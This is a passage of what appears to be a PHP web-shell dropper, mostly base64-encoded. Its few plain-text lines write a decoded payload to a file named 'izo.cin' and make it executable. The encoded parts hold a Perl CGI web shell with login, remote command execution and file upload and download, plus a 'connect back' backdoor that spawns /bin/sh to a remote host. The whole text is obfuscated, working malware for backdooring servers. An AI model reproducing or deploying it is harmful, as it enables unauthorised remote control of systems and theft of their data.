k3RFFwOURRb05DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5DaU1nVkdocGN5Qm1kVzVqZEdsdmJpQmthWE53YkdGNWN5QjBhR1VnY0dGblpTQjBhR0YwSUdOdmJuUmhhVzV6SUdFZ2JHbHVheUIzYUdsamFDQmhiR3h2ZDNNZ2RHaGxJSFZ6WlhJTkNpTWdkRzhnWkc5M2JteHZZV1FnZEdobElITndaV05wWm1sbFpDQm1hV3hsTGlCVWFHVWdjR0ZuWlNCaGJITnZJR052Ym5SaGFXNXpJR0VnWVhWMGJ5MXlaV1p5WlhOb0RRb2pJR1psWVhSMWNtVWdkR2hoZENCemRHRnlkSE1nZEdobElHUnZkMjVzYjJGa0lHRjFkRzl0WVhScFkyRnNiSGt1RFFvaklFRnlaM1Z0Wlc1MElERTZJRVoxYkd4NUlIRjFZV3hwWm1sbFpDQm1hV3hsYm1GdFpTQnZaaUIwYUdVZ1ptbHNaU0IwYnlCaVpTQmtiM2R1Ykc5aFpHVmtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1VISnBiblJFYjNkdWJHOWhaRXhwYm10UVlXZGxEUXA3RFFvSmJHOWpZV3dvSkVacGJHVlZjbXdwSUQwZ1FGODdEUW9KYVdZb0xXVWdKRVpwYkdWVmNtd3BJQ01nYVdZZ2RHaGxJR1pwYkdVZ1pYaHBjM1J6RFFvSmV3MEtDUWtqSUdWdVkyOWtaU0IwYUdVZ1ptbHNaU0JzYVc1cklITnZJSGRsSUdOaGJpQnpaVzVrSUdsMElIUnZJSFJvWlNCaWNtOTNjMlZ5RFFvSkNTUkdhV3hsVlhKc0lEMStJSE12S0Z0ZVlTMTZRUzFhTUMwNVhTa3ZKeVVuTG5WdWNHRmpheWdpU0NvaUxDUXhLUzlsWnpzTkNna0pKRVJ2ZDI1c2IyRmtUR2x1YXlBOUlDSWtVMk55YVhCMFRHOWpZWFJwYjI0L1lUMWtiM2R1Ykc5aFpDWm1QU1JHYVd4bFZYSnNKbTg5WjI4aU93MEtDUWtrU0hSdGJFMWxkR0ZJWldGa1pYSWdQU0FpUEcxbGRHRWdTRlJVVUMxRlVWVkpWajFjSWxKbFpuSmxjMmhjSWlCRFQwNVVSVTVVUFZ3aU1Uc2dWVkpNUFNSRWIzZHViRzloWkV4cGJtdGNJajRpT3cwS0NRa21VSEpwYm5SUVlXZGxTR1ZoWkdWeUtDSmpJaWs3RFFvSkNYQnlhVzUwSUR3OFJVNUVPdzBLUEdOdlpHVStEUW9OQ2xObGJtUnBibWNnUm1sc1pTQWtWSEpoYm5ObVpYSkdhV3hsTGk0dVBHSnlQZzBLU1dZZ2RHaGxJR1J2ZDI1c2IyRmtJR1J2WlhNZ2JtOTBJSE4wWVhKMElHRjFkRzl0WVhScFkyRnNiSGtzRFFvOFlTQm9jbVZtUFNJa1JHOTNibXh2WVdSTWFXNXJJajVEYkdsamF5QklaWEpsUEM5aFBpNE5Da1ZPUkEwS0NRa21VSEpwYm5SRGIyMXRZVzVrVEdsdVpVbHVjSFYwUm05eWJUc05DZ2tKSmxCeWFXNTBVR0ZuWlVadmIzUmxjanNOQ2dsOURRb0paV3h6WlNBaklHWnBiR1VnWkc5bGMyNG5kQ0JsZUdsemRBMEtDWHNOQ2drSkpsQnlhVzUwVUdGblpVaGxZV1JsY2lnaVppSXBPdzBLQ1Fsd2NtbHVkQ0FpUm1GcGJHVmtJSFJ2SUdSdmQyNXNiMkZrSUNSR2FXeGxWWEpzT2lBa0lTSTdEUW9KQ1NaUWNtbHVkRVpwYkdWRWIzZHViRzloWkVadmNtMDdEUW9KQ1NaUWNtbHVkRkJoWjJWR2IyOTBaWEk3RFFvSmZRMEtmUTBLRFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGUm9hWE1nWm5WdVkzUnBiMjRnY21WaFpITWdkR2hsSUhOd1pXTnBabWxsWkNCbWFXeGxJR1p5YjIwZ2RHaGxJR1JwYzJzZ1lXNWtJSE5sYm1SeklHbDBJSFJ2SUhSb1pRMEtJeUJpY205M2MyVnlMQ0J6YnlCMGFHRjBJR2wwSUdOaGJpQmlaU0JrYjNkdWJHOWhaR1ZrSUdKNUlIUm9aU0IxYzJWeUxnMEtJeUJCY21kMWJXVnVkQ0F4T2lCR2RXeHNlU0J4ZFdGc2FXWnBaV1FnY0dGMGFHNWhiV1VnYjJZZ2RHaGxJR1pwYkdVZ2RHOGdZbVVnYzJWdWRDNE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCVFpXNWtSbWxzWlZSdlFuSnZkM05sY2cwS2V3MEtDV3h2WTJGc0tDUlRaVzVrUm1sc1pTa2dQU0JBWHpzTkNnbHBaaWh2Y0dWdUtGTkZUa1JHU1V4RkxDQWtVMlZ1WkVacGJHVXBLU0FqSUdacGJHVWdiM0JsYm1Wa0lHWnZjaUJ5WldGa2FXNW5EUW9KZXcwS0NRbHBaaWdrVjJsdVRsUXBEUW9KQ1hzTkNna0pDV0pwYm0xdlpHVW9VMFZPUkVaSlRFVXBPdzBLQ1FrSlltbHViVzlrWlNoVFZFUlBWVlFwT3cwS0NRbDlEUW9KQ1NSR2FXeGxVMmw2WlNBOUlDaHpkR0YwS0NSVFpXNWtSbWxzWlNrcFd6ZGRPdzBLQ1Frb0pFWnBiR1Z1WVcxbElEMGdKRk5sYm1SR2FXeGxLU0E5ZmlBZ2JTRW9XMTR2WGx4Y1hTb3BKQ0U3RFFvSkNYQnlhVzUwSUNKRGIyNTBaVzUwTFZSNWNHVTZJR0Z3Y0d4cFkyRjBhVzl1TDNndGRXNXJibTkzYmx4dUlqc05DZ2tKY0hKcGJuUWdJa052Ym5SbGJuUXRUR1Z1WjNSb09pQWtSbWxzWlZOcGVtVmNiaUk3RFFvSkNYQnlhVzUwSUNKRGIyNTBaVzUwTFVScGMzQnZjMmwwYVc5dU9pQmhkSFJoWTJodFpXNTBPeUJtYVd4bGJtRnRaVDBrTVZ4dVhHNGlPdzBLQ1Fsd2NtbHVkQ0IzYUdsc1pTZzhVMFZPUkVaSlRFVStLVHNOQ2drSlkyeHZjMlVvVTBWT1JFWkpURVVwT3cwS0NYME5DZ2xsYkhObElDTWdabUZwYkdWa0lIUnZJRzl3Wlc0Z1ptbHNaUTBLQ1hzTkNna0pKbEJ5YVc1MFVHRm5aVWhsWVdSbGNpZ2laaUlwT3cwS0NRbHdjbWx1ZENBaVJtRnBiR1ZrSUhSdklHUnZkMjVzYjJGa0lDUlRaVzVrUm1sc1pUb2dKQ0VpT3cwS0NRa21VSEpwYm5SR2FXeGxSRzkzYm14dllXUkdiM0p0T3cwS0RRb0pDU1pRY21sdWRGQmhaMlZHYjI5MFpYSTdEUW9KZlEwS2ZRMEtEUW9OQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBOQ2lNZ1ZHaHBjeUJtZFc1amRHbHZiaUJwY3lCallXeHNaV1FnZDJobGJpQjBhR1VnZFhObGNpQmtiM2R1Ykc5aFpITWdZU0JtYVd4bExpQkpkQ0JrYVhOd2JHRjVjeUJoSUcxbGMzTmhaMlVOQ2lNZ2RHOGdkR2hsSUhWelpYSWdZVzVrSUhCeWIzWnBaR1Z6SUdFZ2JHbHVheUIwYUhKdmRXZG9JSGRvYVdOb0lIUm9aU0JtYVd4bElHTmhiaUJpWlNCa2IzZHViRzloWkdWa0xnMEtJeUJVYUdseklHWjFibU4wYVc5dUlHbHpJR0ZzYzI4Z1kyRnNiR1ZrSUhkb1pXNGdkR2hsSUhWelpYSWdZMnhwWTJ0eklHOXVJSFJvWVhRZ2JHbHVheTRnU1c0Z2RHaHBjeUJqWVhObExBMEtJeUIwYUdVZ1ptbHNaU0JwY3lCeVpXRmtJR0Z1WkNCelpXNTBJSFJ2SUhSb1pTQmljbTkzYzJWeUxnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtjM1ZpSUVKbFoybHVSRzkzYm14dllXUU5DbnNOQ2draklHZGxkQ0JtZFd4c2VTQnhkV0ZzYVdacFpXUWdjR0YwYUNCdlppQjBhR1VnWm1sc1pTQjBieUJpWlNCa2IzZHViRzloWkdWa0RRb0phV1lvS0NSWGFXNU9WQ0FtSUNna1ZISmhibk5tWlhKR2FXeGxJRDErSUcwdlhseGNmRjR1T2k4cEtTQjhEUW9KQ1NnaEpGZHBiazVVSUNZZ0tDUlVjbUZ1YzJabGNrWnBiR1VnUFg0Z2JTOWVYQzh2S1NrcElDTWdjR0YwYUNCcGN5QmhZbk52YkhWMFpRMEtDWHNOQ2drSkpGUmhjbWRsZEVacGJHVWdQU0FrVkhKaGJuTm1aWEpHYVd4bE93MEtDWDBOQ2dsbGJITmxJQ01nY0dGMGFDQnBjeUJ5Wld4aGRHbDJaUTBLQ1hzTkNna0pZMmh2Y0Nna1ZHRnlaMlYwUm1sc1pTa2dhV1lvSkZSaGNtZGxkRVpwYkdVZ1BTQWtRM1Z5Y21WdWRFUnBjaWtnUFg0Z2JTOWJYRnhjTDEwa0x6c05DZ2tKSkZSaGNtZGxkRVpwYkdVZ0xqMGdKRkJoZEdoVFpYQXVKRlJ5WVc1elptVnlSbWxzWlRzTkNnbDlEUW9OQ2dscFppZ2tUM0IwYVc5dWN5QmxjU0FpWjI4aUtTQWpJSGRsSUdoaGRtVWdkRzhnYzJWdVpDQjBhR1VnWm1sc1pRMEtDWHNOQ2drSkpsTmxibVJHYVd4bFZHOUNjbTkzYzJWeUtDUlVZWEpuWlhSR2FXeGxLVHNOQ2dsOURRb0paV3h6WlNBaklIZGxJR2hoZG1VZ2RHOGdjMlZ1WkNCdmJteDVJSFJvWlNCc2FXNXJJSEJoWjJVTkNnbDdEUW9KQ1NaUWNtbHVkRVJ2ZDI1c2IyRmtUR2x1YTFCaFoyVW9KRlJoY21kbGRFWnBiR1VwT3cwS0NYME5DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5QlVhR2x6SUdaMWJtTjBhVzl1SUdseklHTmhiR3hsWkNCM2FHVnVJSFJvWlNCMWMyVnlJSGRoYm5SeklIUnZJSFZ3Ykc5aFpDQmhJR1pwYkdVdUlFbG1JSFJvWlEwS0l5Qm1hV3hsSUdseklHNXZkQ0J6Y0dWamFXWnBaV1FzSUdsMElHUnBjM0JzWVhseklHRWdabTl5YlNCaGJHeHZkMmx1WnlCMGFHVWdkWE5sY2lCMGJ5QnpjR1ZqYVdaNUlHRU5DaU1nWm1sc1pTd2diM1JvWlhKM2FYTmxJR2wwSUhOMFlYSjBjeUIwYUdVZ2RYQnNiMkZrSUhCeWIyTmxjM011RFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFwemRXSWdWWEJzYjJGa1JtbHNaUTBLZXcwS0NTTWdhV1lnYm04Z1ptbHNaU0JwY3lCemNHVmphV1pwWldRc0lIQnlhVzUwSUhSb1pTQjFjR3h2WVdRZ1ptOXliU0JoWjJGcGJnMEtDV2xtS0NSVWNtRnVjMlpsY2tacGJHVWdaWEVnSWlJcERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1NaUWNtbHVkRVpwYkdWVmNHeHZZV1JHYjNKdE93MEtDUWttVUhKcGJuUlFZV2RsUm05dmRHVnlPdzBLQ1FseVpYUjFjbTQ3RFFvSmZRMEtDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbU1pS1RzTkNnMEtDU01nYzNSaGNuUWdkR2hsSUhWd2JHOWhaR2x1WnlCd2NtOWpaWE56RFFvSmNISnBiblFnSWxWd2JHOWhaR2x1WnlBa1ZISmhibk5tWlhKR2FXeGxJSFJ2SUNSRGRYSnlaVzUwUkdseUxpNHVQR0p5UGlJN0RRb05DZ2tqSUdkbGRDQjBhR1VnWm5Wc2JHeDVJSEYxWVd4cFptbGxaQ0J3WVhSb2JtRnRaU0J2WmlCMGFHVWdabWxzWlNCMGJ5QmlaU0JqY21WaGRHVmtEUW9KWTJodmNDZ2tWR0Z5WjJWMFRtRnRaU2tnYVdZZ0tDUlVZWEpuWlhST1lXMWxJRDBnSkVOMWNuSmxiblJFYVhJcElEMStJRzB2VzF4Y1hDOWRKQzg3RFFvSkpGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdElTaGJYaTllWEZ4ZEtpa2tJVHNOQ2dra1ZHRnlaMlYwVG1GdFpTQXVQU0FrVUdGMGFGTmxjQzRrTVRzTkNnMEtDU1JVWVhKblpYUkdhV3hsVTJsNlpTQTlJR3hsYm1kMGFDZ2thVzU3SjJacGJHVmtZWFJoSjMwcE93MEtDU01nYVdZZ2RHaGxJR1pwYkdVZ1pYaHBjM1J6SUdGdVpDQjNaU0JoY21VZ2JtOTBJSE4xY0hCdmMyVmtJSFJ2SUc5MlpYSjNjbWwwWlNCcGRBMEtDV2xtS0MxbElDUlVZWEpuWlhST1lXMWxJQ1ltSUNSUGNIUnBiMjV6SUc1bElDSnZkbVZ5ZDNKcGRHVWlLUTBLQ1hzTkNna0pjSEpwYm5RZ0lrWmhhV3hsWkRvZ1JHVnpkR2x1WVhScGIyNGdabWxzWlNCaGJISmxZV1I1SUdWNGFYTjBjeTQ4WW5JK0lqc05DZ2w5RFFvSlpXeHpaU0FqSUdacGJHVWdhWE1nYm05MElIQnlaWE5sYm5RTkNnbDdEUW9KQ1dsbUtHOXdaVzRvVlZCTVQwRkVSa2xNUlN3Z0lqNGtWR0Z5WjJWMFRtRnRaU0lwS1EwS0NRbDdEUW9KQ1FsaWFXNXRiMlJsS0ZWUVRFOUJSRVpKVEVVcElHbG1JQ1JYYVc1T1ZEc05DZ2tKQ1hCeWFXNTBJRlZRVEU5QlJFWkpURVVnSkdsdWV5ZG1hV3hsWkdGMFlTZDlPdzBLQ1FrSlkyeHZjMlVvVlZCTVQwRkVSa2xNUlNrN0RRb0pDUWx3Y21sdWRDQWlWSEpoYm5ObVpYSmxaQ0FrVkdGeVoyVjBSbWxzWlZOcGVtVWdRbmwwWlhNdVBHSnlQaUk3RFFvSkNRbHdjbWx1ZENBaVJtbHNaU0JRWVhSb09pQWtWR0Z5WjJWMFRtRnRaVHhpY2o0aU93MEtDUWw5RFFvSkNXVnNjMlVOQ2drSmV3MEtDUWtKY0hKcGJuUWdJa1poYVd4bFpEb2dKQ0U4WW5JK0lqc05DZ2tKZlEwS0NYME5DZ2x3Y21sdWRDQWlJanNOQ2drbVVISnBiblJEYjIxdFlXNWtUR2x1WlVsdWNIVjBSbTl5YlRzTkNnMEtDU1pRY21sdWRGQmhaMlZHYjI5MFpYSTdEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpZV3hzWldRZ2QyaGxiaUIwYUdVZ2RYTmxjaUIzWVc1MGN5QjBieUJrYjNkdWJHOWhaQ0JoSUdacGJHVXVJRWxtSUhSb1pRMEtJeUJtYVd4bGJtRnRaU0JwY3lCdWIzUWdjM0JsWTJsbWFXVmtMQ0JwZENCa2FYTndiR0Y1Y3lCaElHWnZjbTBnWVd4c2IzZHBibWNnZEdobElIVnpaWElnZEc4Z2MzQmxZMmxtZVNCaERRb2pJR1pwYkdVc0lHOTBhR1Z5ZDJselpTQnBkQ0JrYVhOd2JHRjVjeUJoSUcxbGMzTmhaMlVnZEc4Z2RHaGxJSFZ6WlhJZ1lXNWtJSEJ5YjNacFpHVnpJR0VnYkdsdWF3MEtJeUIwYUhKdmRXZG9JQ0IzYUdsamFDQjBhR1VnWm1sc1pTQmpZVzRnWW1VZ1pHOTNibXh2WVdSbFpDNE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCRWIzZHViRzloWkVacGJHVU5DbnNOQ2draklHbG1JRzV2SUdacGJHVWdhWE1nYzNCbFkybG1hV1ZrTENCd2NtbHVkQ0IwYUdVZ1pHOTNibXh2WVdRZ1ptOXliU0JoWjJGcGJnMEtDV2xtS0NSVWNtRnVjMlpsY2tacGJHVWdaWEVnSWlJcERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1NaUWNtbHVkRVpwYkdWRWIzZHViRzloWkVadmNtMDdEUW9KQ1NaUWNtbHVkRkJoWjJWR2IyOTBaWEk3RFFvSkNYSmxkSFZ5YmpzTkNnbDlEUW9KRFFvSkl5Qm5aWFFnWm5Wc2JIa2djWFZoYkdsbWFXVmtJSEJoZEdnZ2IyWWdkR2hsSUdacGJHVWdkRzhnWW1VZ1pHOTNibXh2WVdSbFpBMEtDV2xtS0Nna1YybHVUbFFnSmlBb0pGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdEwxNWNYSHhlTGpvdktTa2dmQTBLQ1Frb0lTUlhhVzVPVkNBbUlDZ2tWSEpoYm5ObVpYSkdhV3hsSUQxK0lHMHZYbHd2THlrcEtTQWpJSEJoZEdnZ2FYTWdZV0p6YjJ4MWRHVU5DZ2w3RFFvSkNTUlVZWEpuWlhSR2FXeGxJRDBnSkZSeVlXNXpabVZ5Um1sc1pUc05DZ2w5RFFvSlpXeHpaU0FqSUhCaGRHZ2dhWE1nY21Wc1lYUnBkbVVOQ2dsN0RRb0pDV05vYjNBb0pGUmhjbWRsZEVacGJHVXBJR2xtS0NSVVlYSm5aWFJHYVd4bElEMGdKRU4xY25KbGJuUkVhWElwSUQxK0lHMHZXMXhjWEM5ZEpDODdEUW9KQ1NSVVlYSm5aWFJHYVd4bElDNDlJQ1JRWVhSb1UyVndMaVJVY21GdWMyWmxja1pwYkdVN0RRb0pmUTBLRFFvSmFXWW9KRTl3ZEdsdmJuTWdaWEVnSW1kdklpa2dJeUIzWlNCb1lYWmxJSFJ2SUhObGJtUWdkR2hsSUdacGJHVU5DZ2w3RFFvSkNTWlRaVzVrUm1sc1pWUnZRbkp2ZDNObGNpZ2tWR0Z5WjJWMFJtbHNaU2s3RFFvSmZRMEtDV1ZzYzJVZ0l5QjNaU0JvWVhabElIUnZJSE5sYm1RZ2IyNXNlU0IwYUdVZ2JHbHVheUJ3WVdkbERRb0pldzBLQ1FrbVVISnBiblJFYjNkdWJHOWhaRXhwYm10UVlXZGxLQ1JVWVhKblpYUkdhV3hsS1RzTkNnbDlEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdUV0ZwYmlCUWNtOW5jbUZ0SUMwZ1JYaGxZM1YwYVc5dUlGTjBZWEowY3lCSVpYSmxEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9tVW1WaFpGQmhjbk5sT3cwS0prZGxkRU52YjJ0cFpYTTdEUW9OQ2lSVFkzSnBjSFJNYjJOaGRHbHZiaUE5SUNSRlRsWjdKMU5EVWtsUVZGOU9RVTFGSjMwN0RRb2tVMlZ5ZG1WeVRtRnRaU0E5SUNSRlRsWjdKMU5GVWxaRlVsOU9RVTFGSjMwN0RRb2tURzluYVc1UVlYTnpkMjl5WkNBOUlDUnBibnNuY0NkOU93MEtKRkoxYmtOdmJXMWhibVFnUFNBa2FXNTdKMk1uZlRzTkNpUlVjbUZ1YzJabGNrWnBiR1VnUFNBa2FXNTdKMlluZlRzTkNpUlBjSFJwYjI1eklEMGdKR2x1ZXlkdkozMDdEUW9OQ2lSQlkzUnBiMjRnUFNBa2FXNTdKMkVuZlRzTkNpUkJZM1JwYjI0Z1BTQWliRzluYVc0aUlHbG1LQ1JCWTNScGIyNGdaWEVnSWlJcE95QWpJRzV2SUdGamRHbHZiaUJ6Y0dWamFXWnBaV1FzSUhWelpTQmtaV1poZFd4MERRb05DaU1nWjJWMElIUm9aU0JrYVhKbFkzUnZjbmtnYVc0Z2QyaHBZMmdnZEdobElHTnZiVzFoYm1SeklIZHBiR3dnWW1VZ1pYaGxZM1YwWldRTkNpUkRkWEp5Wlc1MFJHbHlJRDBnSkdsdWV5ZGtKMzA3RFFwamFHOXdLQ1JEZFhKeVpXNTBSR2x5SUQwZ1lDUkRiV1JRZDJSZ0tTQnBaaWdrUTNWeWNtVnVkRVJwY2lCbGNTQWlJaWs3RFFvTkNpUk1iMmRuWldSSmJpQTlJQ1JEYjI5cmFXVnpleWRUUVZaRlJGQlhSQ2Q5SUdWeElDUlFZWE56ZDI5eVpEc05DZzBLYVdZb0pFRmpkR2x2YmlCbGNTQWliRzluYVc0aUlIeDhJQ0VrVEc5bloyVmtTVzRwSUNNZ2RYTmxjaUJ1WldWa2N5OW9ZWE1nZEc4Z2JHOW5hVzROQ25zTkNna21VR1Z5Wm05eWJVeHZaMmx1T3cwS0RRcDlEUXBsYkhOcFppZ2tRV04wYVc5dUlHVnhJQ0pqYjIxdFlXNWtJaWtnSXlCMWMyVnlJSGRoYm5SeklIUnZJSEoxYmlCaElHTnZiVzFoYm1RTkNuc05DZ2ttUlhobFkzVjBaVU52YlcxaGJtUTdEUXA5RFFwbGJITnBaaWdrUVdOMGFXOXVJR1Z4SUNKMWNHeHZZV1FpS1NBaklIVnpaWElnZDJGdWRITWdkRzhnZFhCc2IyRmtJR0VnWm1sc1pRMEtldzBLQ1NaVmNHeHZZV1JHYVd4bE93MEtmUTBLWld4emFXWW9KRUZqZEdsdmJpQmxjU0FpWkc5M2JteHZZV1FpS1NBaklIVnpaWElnZDJGdWRITWdkRzhnWkc5M2JteHZZV1FnWVNCbWFXeGxEUXA3RFFvSkprUnZkMjVzYjJGa1JtbHNaVHNOQ24wTkNtVnNjMmxtS0NSQlkzUnBiMjRnWlhFZ0lteHZaMjkxZENJcElDTWdkWE5sY2lCM1lXNTBjeUIwYnlCc2IyZHZkWFFOQ25zTkNna21VR1Z5Wm05eWJVeHZaMjkxZERzTkNuMEh6b2NpRHl0ZWZ3MEsyckYxS0hVZ1hsaklwMzFvSVdMT2h5Sk9kM0ZzWlNNaEwzVnpjaTlpYVc0dmNHVnliQTBLSUNBZ0lDQWdkWE5sSUZOdlkydGxkRHNOQ2lBZ0lDQWdJSEJ5YVc1MElDSkVZWFJoSUVOb1lUQnpJRU52Ym01bFkzUWdRbUZqYXlCQ1lXTnJaRzl2Y2x4dVhHNGlPdzBLSUNBZ0lDQWdhV1lnS0NFa1FWSkhWbHN3WFNrZ2V3MEtJQ0FnSUNBZ0lDQndjbWx1ZEdZZ0lsVnpZV2RsT2lBa01DQmJTRzl6ZEYwZ1BGQnZjblErWEc0aU93MEtJQ0FnSUNBZ0lDQmxlR2wwS0RFcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQkVkVzF3YVc1bklFRnlaM1Z0Wlc1MGMxeHVJanNOQ2lBZ0lDQWdJQ1JvYjNOMElEMGdKRUZTUjFaYk1GMDdEUW9nSUNBZ0lDQWtjRzl5ZENBOUlEZ3dPdzBLSUNBZ0lDQWdhV1lnS0NSQlVrZFdXekZkS1NCN0RRb2dJQ0FnSUNBZ0lDUndiM0owSUQwZ0pFRlNSMVpiTVYwN0RRb2dJQ0FnSUNCOURRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lwZElFTnZibTVsWTNScGJtY3VMaTVjYmlJN0RRb2dJQ0FnSUNBa2NISnZkRzhnUFNCblpYUndjbTkwYjJKNWJtRnRaU2duZEdOd0p5a2dmSHdnWkdsbEtDSlZibXR1YjNkdUlGQnliM1J2WTI5c1hHNGlLVHNOQ2lBZ0lDQWdJSE52WTJ0bGRDaFRSVkpXUlZJc0lGQkdYMGxPUlZRc0lGTlBRMHRmVTFSU1JVRk5MQ0FrY0hKdmRHOHBJSHg4SUdScFpTQW9JbE52WTJ0bGRDQkZjbkp2Y2x4dUlpazdEUW9nSUNBZ0lDQnRlU0FrZEdGeVoyVjBJRDBnYVc1bGRGOWhkRzl1S0NSb2IzTjBLVHNOQ2lBZ0lDQWdJR2xtSUNnaFkyOXVibVZqZENoVFJWSldSVklzSUhCaFkyc2dJbE51UVRSNE9DSXNJRElzSUNSd2IzSjBMQ0FrZEdGeVoyVjBLU2tnZXcwS0lDQWdJQ0FnSUNCa2FXVW9JbFZ1WVdKc1pTQjBieUJEYjI1dVpXTjBYRzRpS1RzTkNpQWdJQ0FnSUgwTkNpQWdJQ0FnSUhCeWFXNTBJQ0piS2wwZ1UzQmhkMjVwYm1jZ1UyaGxiR3hjYmlJN0RRb2dJQ0FnSUNCcFppQW9JV1p2Y21zb0lDa3BJSHNOQ2lBZ0lDQWdJQ0FnYjNCbGJpaFRWRVJKVGl3aVBpWlRSVkpXUlZJaUtUc05DaUFnSUNBZ0lDQWdiM0JsYmloVFZFUlBWVlFzSWo0bVUwVlNWa1ZTSWlrN0RRb2dJQ0FnSUNBZ0lHOXdaVzRvVTFSRVJWSlNMQ0krSmxORlVsWkZVaUlwT3cwS0lDQWdJQ0FnSUNCbGVHVmpJSHNuTDJKcGJpOXphQ2Q5SUNjdFltRnphQ2NnTGlBaVhEQWlJSGdnTkRzTkNpQWdJQ0FnSUNBZ1pYaHBkQ2d3S1RzTkNpQWdJQ0FnSUgwTkNpQWdJQ0FnSUhCeWFXNTBJQ0piS2wwZ1JHRjBZV05vWldSY2JseHVJanM9JzsNCg0KJGZpbGUgPSBmb3BlbigiaXpvLmNpbiIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY2dpc2hlbGxpem9jaW4pKTsNCmZjbG9zZSgkZmlsZSk7DQogICAgY2htb2QoIml6by5jaW4iLDA3NTUpOw0KJG5ldGNhdHNoZWxsID0gJ0l5RXZkWE55TDJKcGJpOXdaWEpzRFFvZ0lDQWdJQ0IxYzJVZ1UyOWphMlYwT3cwS0lDQWdJQ0FnY0hKcGJuUWdJa1JoZEdFZ1EyaGgNCk1ITWdRMjl1Ym1WamRDQkNZV05ySUVKaFkydGtiMjl5WEc1Y2JpSTdEUW9nSUNBZ0lDQnBaaUFvSVNSQlVrZFdXekJkS1NCN0RRb2cNCklDQWdJQ0FnSUhCeWFXNTBaaUFpVlhOaFoyVTZJQ1F3SUZ0SWIzTjBYU0E4VUc5eWRENWNiaUk3RFFvZ0lDQWdJQ0FnSUdWNGFYUW8NCk1TazdEUW9nSUNBZ0lDQjlEUW9nSUNBZ0lDQndjbWx1ZENBaVd5cGRJRVIxYlhCcGJtY2dRWEpuZFcxbGJuUnpYRzRpT3cwS0lDQWcNCklDQWdKR2h2YzNRZ1BTQWtRVkpIVmxzd1hUc05DaUFnSUNBZ0lDUndiM0owSUQwZ09EQTdEUW9nSUNBZ0lDQnBaaUFvSkVGU1IxWmINCk1WMHBJSHNOQ2lBZ0lDQWdJQ0FnSkhCdmNuUWdQU0FrUVZKSFZsc3hYVHNOQ2lBZ0lDQWdJSDBOQ2lBZ0lDQWdJSEJ5YVc1MElDSmINCktsMGdRMjl1Ym1WamRHbHVaeTR1TGx4dUlqc05DaUFnSUNBZ0lDUndjbTkwYnlBOUlHZGxkSEJ5YjNSdllubHVZVzFsS0NkMFkzQW4NCktTQjhmQ0JrYVdVb0lsVnVhMjV2ZDI0Z1VISnZkRzlqYjJ4Y2JpSXBPdzBLSUNBZ0lDQWdjMjlqYTJWMEtGTkZVbFpGVWl3Z1VFWmYNClNVNUZWQ3dnVTA5RFMxOVRWRkpGUVUwc0lDUndjbTkwYnlrZ2ZId2